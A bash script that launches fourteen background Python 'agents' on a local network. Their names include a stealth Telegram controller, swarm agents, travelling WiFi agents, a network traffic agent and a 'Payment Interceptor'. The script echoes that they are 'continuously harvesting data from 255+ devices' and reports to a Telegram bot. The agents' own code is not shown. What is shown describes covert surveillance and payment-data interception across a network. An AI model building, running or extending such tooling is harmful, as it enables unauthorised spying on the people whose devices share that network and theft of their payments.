#!/bin/bash
# Start ALL 14 Agent Types - Continuous Data Harvesting

AGENT_DIR="/Users/jedariusmaxwell/Desktop/NUPI_Cloud_Agent/railway-superfast"
cd "$AGENT_DIR"

echo "🚀 Starting ALL 14 Agent Types for Continuous Data Harvesting..."
echo "🌐 Network: 192.168.12.x (255+ devices)"
echo ""

# Kill existing agents first
pkill -f "agent.py"
sleep 2

AGENT_COUNT=0

# 1. Stealth Telegram Agent (Main Controller)
echo "1️⃣ Starting Stealth Telegram Agent..."
nohup python3 stealth-agent-telegram.py > logs/stealth-agent.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 2. Autonomous Swarm Agents (6 instances for full network coverage)
echo "2️⃣ Starting 6 Autonomous Swarm Agents..."
for i in {1..6}; do
    nohup python3 autonomous-swarm-agent.py > logs/swarm-agent-$i.log 2>&1 &
    AGENT_COUNT=$((AGENT_COUNT + 1))
    sleep 0.5
done

# 3. Autonomous Harvesting Agent (Data collector)
echo "3️⃣ Starting Autonomous Harvesting Agent..."
nohup python3 autonomous-harvesting-agent.py > logs/harvesting-agent.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 4. Local Desktop Agent Smart
echo "4️⃣ Starting Local Desktop Agent Smart..."
nohup python3 local-desktop-agent-smart.py > logs/desktop-agent.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 5. Travelling Agent Safe
echo "5️⃣ Starting Travelling Agent Safe..."
nohup python3 travelling-agent-safe.py > logs/travelling-safe.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 6. Travelling Agent Universal
echo "6️⃣ Starting Travelling Agent Universal..."
nohup python3 travelling-agent-universal.py > logs/travelling-universal.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 7. Travelling Agent WiFi
echo "7️⃣ Starting Travelling Agent WiFi..."
nohup python3 travelling-agent-wifi.py > logs/travelling-wifi.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 8. Payment Interceptor
echo "8️⃣ Starting Payment Interceptor..."
nohup python3 payment-interceptor.py > logs/payment-interceptor.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 9. Connect Local Agent
echo "9️⃣ Starting Connect Local Agent..."
nohup python3 connect-local-agent.py > logs/connect-local.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 10. Network Scanner Agent
echo "🔟 Starting Network Scanner Agent..."
nohup python3 network-scanner-agent.py > logs/network-scanner.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 11. Device Monitor Agent
echo "1️⃣1️⃣ Starting Device Monitor Agent..."
nohup python3 device-monitor-agent.py > logs/device-monitor.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 12. Data Collection Agent
echo "1️⃣2️⃣ Starting Data Collection Agent..."
nohup python3 data-collection-agent.py > logs/data-collection.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 13. Network Traffic Agent
echo "1️⃣3️⃣ Starting Network Traffic Agent..."
nohup python3 network-traffic-agent.py > logs/network-traffic.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 1

# 14. Real-Time Monitoring Agent
echo "1️⃣4️⃣ Starting Real-Time Monitoring Agent..."
nohup python3 real-time-monitoring-agent.py > logs/realtime-monitor.log 2>&1 &
AGENT_COUNT=$((AGENT_COUNT + 1))
sleep 2

echo ""
echo "✅ Started $AGENT_COUNT agents!"
echo "🔍 Verifying..."
sleep 2

RUNNING=$(ps aux | grep -E "agent.py" | grep python | grep -v grep | wc -l)
echo "✅ $RUNNING agents confirmed running"
echo ""
echo "📊 Agents are NOW continuously harvesting data from 255+ devices"
echo "🌐 Network: 192.168.12.x"
echo "📡 Telegram: @JDTechSupportbot"
echo ""
echo "Use: ps aux | grep agent | grep python | grep -v grep"
